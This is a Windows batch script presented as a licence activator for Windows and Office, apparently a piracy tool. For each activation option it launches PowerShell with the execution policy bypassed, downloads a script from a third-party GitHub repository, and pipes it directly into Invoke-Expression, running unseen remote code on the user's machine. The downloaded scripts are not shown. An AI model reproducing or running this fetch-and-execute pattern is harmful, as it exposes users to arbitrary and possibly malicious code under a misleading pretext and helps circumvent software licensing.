@echo off
:MENU
cls
echo -------------------------------------------
echo   Activate license type 
echo [1] Activate Windows
echo [2] Activate Office
echo -------------------------------------------
echo   Others
echo [3] Exit
echo ============================================
set /p choice=Select 1 of 3 functions ( 1 , 2 ,3 ) :

if "%choice%"=="1" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/ranusTeam41/kinovrise/main/Activate-Windows.ps1 | iex"
    pause
    goto MENU
)
if "%choice%"=="2" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/ranusTeam41/kinovrise/main/Activate-Office.ps1 | iex"
    pause
    goto MENU
)
if "%choice%"=="3" (
    exit
)

echo Invalid choice. Try again.
timeout /t 1 >nul
goto MENU
